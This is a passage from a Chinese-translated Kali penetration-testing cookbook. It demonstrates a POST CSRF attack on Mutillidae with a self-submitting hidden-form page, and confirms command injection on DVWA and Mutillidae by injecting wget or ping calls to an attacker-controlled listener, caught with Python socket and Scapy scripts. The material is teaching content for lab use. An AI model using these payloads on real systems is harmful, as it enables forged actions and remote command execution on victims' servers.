但是，这种可以简单利用的 CSRF 漏洞很少存在。这是因为多数开发者对安全拥有起码的终止，不会使用 GET 方法参数来执行安全事务。POST 方法 CSRF 的一个例子是 Mutillidae  应用的 `blog`功能，像这样：

```
POST /mutillidae/index.php?page=add-to-your-blog.php HTTP/1.1 
Host: 172.16.36.135 
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: http://172.16.36.135/mutillidae/index.php?page=add-to-your-blog. php 
Cookie: username=Victim; uid=17; PHPSESSID=8aa4a24cd6087911eca39c1cb95a7 b0c 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 98

csrf-token=SecurityIsDisabled&blog_entry=This+is+my+blog+entry&add-toyour-blog-php-submit-button=Save+Blog+Entry
```

上面的例子中，我们可以看到，验证用户所提交的`blog`入口通过`blog_entry`POST 方法参数传递。为了利用这个 CSRF 控制的缺失，攻击者需要构造恶意页面，它能导致受害者提交所需的参数。下面是个 POST 方法 CSRF 攻击的例子：

```html
<html> 
<head>        
    <title></title> 
</head> 
<body>        
    <form name="csrf" method="post" action="http://172.16.36.135/ mutillidae/index.php?page=add-t$                
        <input type="hidden" name="csrf-token" value="SecurityIsDisabled" />                
        <input type="hidden" name="blog_entry" value="HACKED" />                
        <input type="hidden" name="add-to-your-blog-phpsubmit-button" value="Save+Blog+Entr$        
    </form>        
    <script type="text/javascript">                
        document.csrf.submit();        
    </script> </body> </html> 
```

这个恶意 Web 页面使用了 HTML 表单，它将多个隐藏的输入字段返回给服务器，这些字段对应 Mutillidae 应用的`blog`入口提交请求所需的相同输入。此外，JS 用于提交表单。所有这些事情在受害者不执行任何操作的情况下就会发生。考虑下面的例子：

```
root@KaliLinux:~# mv CSRF.html /var/www/ 
root@KaliLinux:~# /etc/init.d/apache2 start 
[....] Starting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName 
. ok
```

为了部署这个恶意 Web 内容，应该将其移动到 Web 根目录下。在 Kali 中，默认的 Apache Web 根目录是`/var/www/`。同样，确保 Apache2 服务已打开。像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-17-1.jpg)

当验证后的受害者浏览器恶意页面时，受害者会自动重定向到 Mutillidae  博客应用，并提交博客入口`HACKED `。

### 工作原理

CSRF 的成因是请求最终由用户的会话生成。这个攻击利用受害者浏览器已经和远程 Web 服务器建立连接的信任。在 GET 方法 CSRF 的例子中，受害者被诱导访问某个 URL，其中的参数为恶意事务而定义。在 POST 方法 CSRF 的例子中，受害者被诱导浏览定义了参数的页面，这些参数随后会由受害者的浏览器转发给漏洞服务器，来指定恶意事务。在每个例子中，事务由于请求来自受害者的浏览器而被执行，受害者已经和漏洞服务器建立了可信的会话。

## 7.18 使用 HTTP 流量验证命令注入漏洞

命令注入可能是移植 Web 应用攻击向量中最危险的漏洞了。多数攻击者尝试利用该漏洞，以期望它们最后能够在底层 OS 上执行任意的代码。命令执行漏洞提供了无需额外步骤的可能。这个秘籍中，我们会讨论如何使用 Web 服务器日志或自定义 Web 服务脚本来确认命令执行漏洞。

### 准备

为了对目标执行命令注入漏洞测试，你需要拥有运行一个或多个含有命令执行漏洞的 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，这个秘籍也需要使用例如 VIM 或者 Nano 的文本编辑器，将脚本写到文件系统。更多编写脚本的信息请参考第一章的“使用文本编辑器（VIM 或 Nano）”秘籍。

### 操作步骤

通过执行命令，强迫后端系统和 Web 服务器交互，我们就能够验证 Web 应用中的命令注入漏洞。日志可以作为漏洞服务器和它交互的证据。作为替代，可以编写一个自定义脚本来生成一个临时的 Web 服务，它可以监听外部连接，并打印接收到的请求。下面的 Python 代码完成了这件事情：

```py
#!/usr/bin/python
import socket
httprecv = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
httprecv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
httprecv.bind(("0.0.0.0",8000)) 
httprecv.listen(2)

(client, ( ip,sock)) = httprecv.accept()
print "Received connection from : ", ip 
data = client.recv(4096) 
print str(data)

client.close() 
httprecv.close() 
```

一旦执行脚本，我们需要强迫目标服务器和监听服务交互，来确认命令注入漏洞。DWVA 应用拥有`ping`功能，可以用于 ping 一个指定 IP 地址。用户输入直接传递给系统调用，可以修改来执行底层 OS 的任意命令、我们可以通过使用分号来添加多个命令，每个命令依次排列，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-18-1.jpg)

在上面的例子中，输入用于 ping `127.0.0.1`，并且对`http://172.16.36.224:8000`执行`wget`。`wget`请求对应临时的 Python 监听服务。在提交输入后，我们可以通过参考脚本的输入来验证命令执行：

```py
root@KaliLinux:~# ./httprecv.py 
Received connection from :  172.16.36.135 
GET / HTTP/1.0 
User-Agent: Wget/1.10.2 
Accept: */* Host: 172.16.36.224:8000 
Connection: Keep-Alive 
```

### 工作原理

Python 脚本用于确认命令执行漏洞，因为它证明了命令可以通过来自不同系统的注入载荷在目标服务器上执行。载荷输入到服务器的时候，不可能同时执行相似的请求。但是，即使载荷并不是被检测到的流量的真正来源，我们也可以轻易尝试多次来排除错误情况。

## 7.19 使用 ICMP 流量 来验证命令注入

命令注入可能是移植 Web 应用攻击向量中最危险的漏洞了。多数攻击者尝试利用该漏洞，以期望它们最后能够在底层 OS 上执行任意的代码。命令执行漏洞提供了无需额外步骤的可能。这个秘籍中，我们会讨论如何使用 ICMP 流量来编写用于确认命令执行漏洞的自定义脚本。

### 准备

为了对目标执行命令注入漏洞测试，你需要拥有运行一个或多个含有命令执行漏洞的 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，这个秘籍也需要使用例如 VIM 或者 Nano 的文本编辑器，将脚本写到文件系统。更多编写脚本的信息请参考第一章的“使用文本编辑器（VIM 或 Nano）”秘籍。

### 操作步骤

通过执行命令，强迫后端系统发送 ICMP 流量给监听服务，我们可以验证 Web 应用中的命令注入漏洞。接收到的 ICMP 回响请求可以用于识别漏洞系统。下面是一段 Python 代码，使用 Scapy 库来实现：

```py
#!/usr/bin/python

import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
from scapy.all import *

def rules(pkt):   
    try:      
        if (pkt[IP].dst=="172.16.36.224") and (pkt[ICMP]):         
            print str(pkt[IP].src) + " is exploitable"   
    except:      
        pass

print "Listening for Incoming ICMP Traffic.  Use Ctrl+C to stop listening"

sniff(lfilter=rules,store=0)
```

在 ICMP 监听器执行之后，我们需要尝试从漏洞服务器向监听服务发送 ICMP 回响请求。这可以通过将`ping`命令注入到存在命令注入漏洞的用户输入来完成。在 Mutillidae 中，执行 DNS 枚举的功能存在漏洞，它直接将用户输入传递给系统调用。通过使用分号，单独的`ping`请求可以追加到用户输入后面。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-19-1.jpg)

假设服务器存在命令注入漏洞，Python 监听器会提示收到了 ICMP 回响请求，而且目标服务器可能存在漏洞。

```
root@KaliLinux:~# ./listener.py 
Listening for Incoming ICMP Traffic.  Use Ctrl+C to stop listening 
172.16.36.135 is exploitable
```

### 工作原理

Python 脚本用于确认命令执行漏洞，因为它证明了命令可以通过来自不同系统的注入载荷在目标服务器上执行。载荷输入到服务器的时候，不可能同时执行相似的请求。但是，即使载荷并不是被检测到的流量的真正来源，我们也可以轻易尝试多次来排除错误情况。
